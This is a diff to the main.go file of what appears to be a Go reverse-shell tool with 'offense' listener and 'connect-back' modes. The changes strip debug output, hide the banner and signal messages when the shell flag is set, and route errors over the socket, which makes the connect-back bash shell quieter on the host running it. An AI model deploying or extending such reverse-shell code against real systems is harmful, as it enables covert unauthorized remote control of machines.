@@ -2,7 +2,6 @@ package main
 
 import (
 	"bufio"
-	"bytes"
 	"errors"
 	"fmt"
 	"io"
@@ -20,44 +19,42 @@ func runApp(c utils.ConnectionGetter) {
 	// Parse flags from user, attach to struct:
 	flagStruct := utils.GetFlags()
 
-	// Print banner:
-	fmt.Printf("%s", utils.Banner())
-
 	// Create peer instance based on user input:
 	var thisPeer *utils.Peer = utils.CreatePeer(flagStruct.Port, flagStruct.Host, flagStruct.Listen, flagStruct.Shell)
-	fmt.Printf("Address of peer in main.go = %p\n", thisPeer)
 
-	// Update user:
-	var updateUserBanner string = utils.UserSelectionBanner(thisPeer.ConnectionType, thisPeer.Address, thisPeer.RPort, thisPeer.LPort)
-	fmt.Println(updateUserBanner)
+	// Print banner:
+	if !thisPeer.Shell {
+		fmt.Printf("%s", utils.Banner())
+
+		// Update user:
+		var updateUserBanner string = utils.UserSelectionBanner(thisPeer.ConnectionType, thisPeer.Address, thisPeer.RPort, thisPeer.LPort)
+		fmt.Println(updateUserBanner)
+	}
 
 	// Make connection:
 	var socket utils.Socket
 	if thisPeer.ConnectionType == "offense" {
 		socket = c.GetConnectionFromListener(thisPeer.LPort, thisPeer.Address)
-		//fmt.Printf("Socket address in main.go = %p\n", socket)
 	} else {
-		socket = c.GetConnectionFromClient(thisPeer.RPort, thisPeer.Address)
+		socket = c.GetConnectionFromClient(thisPeer.RPort, thisPeer.Address, thisPeer.Shell)
 	}
-
-	fmt.Printf("Address of socket in main.go: %p\n", socket)
 
 	// Connect socket connection to peer
 	thisPeer.Connection = socket
-	fmt.Printf("Address of socket on peer struct = %p\n", thisPeer.Connection)
 
 	// If shell flag is true, start shell:
 	var shell utils.BashShell
+	var shellErr error
 	if thisPeer.Shell && thisPeer.ConnectionType == "connect-back" {
 		var realShellGetter utils.RealShellGetter
-
-		shell = realShellGetter.GetConnectBackInitiatedShell()
-		fmt.Printf("Address of shell in main.go: %p\n", shell)
-
+		shell, shellErr = realShellGetter.GetConnectBackInitiatedShell()
+		if shellErr != nil {
+			// Send error through socket back to listener peer.
+			socket.Write([]byte(shellErr.Error()))
+			os.Exit(1)
+		}
 		// Connect shell to peer:
-		// Get pointer to shell underlying interface:
 		thisPeer.ShellProcess = shell
-		fmt.Printf("address of shell on peer struct (main.go) = %p\n", thisPeer.ShellProcess)
 	}
 
 	// Update banner w/ missing port:
@@ -67,16 +64,13 @@ func runApp(c utils.ConnectionGetter) {
 	// Start SIGINT go routine & start channel to listen for SIGINT:
 	listenForSIGINT(thisPeer)
 
-	// var stdin *io.WriteCloser
-	// var stdout *io.ReadCloser
-	// var stderr *io.ReadCloser
-
 	if thisPeer.ConnectionType == "connect-back" && thisPeer.Shell {
 		// Start shell:
 		socketT := socket.(*utils.RealSocket)
 		erR := thisPeer.ShellProcess.StartShell(socketT)
 		if erR != nil {
-			log.Fatalf("Error starting shell process: %v\n", erR)
+			socket.Write([]byte(erR.Error()))
+			os.Exit(1)
 		}
 	} else {
 		// Go routines to read incoming data:
@@ -87,7 +81,6 @@ func runApp(c utils.ConnectionGetter) {
 				if err != nil {
 					log.Fatalf("Error reading input from user: %v\n", err)
 				}
-
 				c <- userInput
 			}
 		}
@@ -97,11 +90,6 @@ func runApp(c utils.ConnectionGetter) {
 			for {
 				dataReadFromSocket, err := socket.Read()
 				if len(dataReadFromSocket) > 0 {
-					fmt.Printf("data from socket is lenght: %v\n", len(dataReadFromSocket))
-					// Trim white space:
-					trimmed := bytes.TrimSpace(dataReadFromSocket)
-
-					fmt.Printf("trimmed: %s\n", string(trimmed))
 					c <- dataReadFromSocket
 				}
 				if err != nil {
@@ -111,7 +99,6 @@ func runApp(c utils.ConnectionGetter) {
 					netErr, isANetError := err.(net.Error)
 					if isANetError && netErr.Timeout() {
 						// If the socket timed out, have to set read deadline again (or connection will close):
-						//socket.SetSocketReadDeadline(300)
 						continue
 					} else if errors.Is(err, io.EOF) {
 						continue
@@ -123,17 +110,12 @@ func runApp(c utils.ConnectionGetter) {
 		}
 
 		// Write go routines
-		writeToSocket := func(dataToWrite string, socket utils.Socket) {
+		writeToSocket := func(data string, socket utils.Socket) {
 			// Check length so we can clear channel, but not send blank data:
-			if len(dataToWrite) > 0 {
-				fmt.Printf("writing to socket\n")
-				bytesWritten, erR := socket.Write([]byte(dataToWrite))
+			if len(data) > 0 {
+				_, erR := socket.Write([]byte(data))
 				if erR != nil {
 					log.Fatalf("Error writing user input buffer to socket: %v\n", erR)
-				}
-
-				if bytesWritten <= 0 {
-					fmt.Printf("No bytes written to socket?\n")
 				}
 			}
 			return
@@ -184,7 +166,9 @@ func listenForSIGINT(thisPeer *utils.Peer) { // POINTER: passing Peer by referen
 	go func() {
 		for sig := range signalChan {
 			if sig.String() == "interrupt" {
-				fmt.Printf("signal: %v\n", sig)
+				if !thisPeer.Shell {
+					fmt.Printf("signal: %v\n", sig)
+				}
 				thisPeer.Connection.Close()
 				os.Exit(2)
 			}
@@ -197,14 +181,3 @@ func main() {
 	var realConnection utils.RealConnectionGetter
 	runApp(realConnection)
 }
-
-/*
-
-
-golang process (os.stdin)
-	- starts subprocess bash shell
-	- -c
-
-
-
-*/
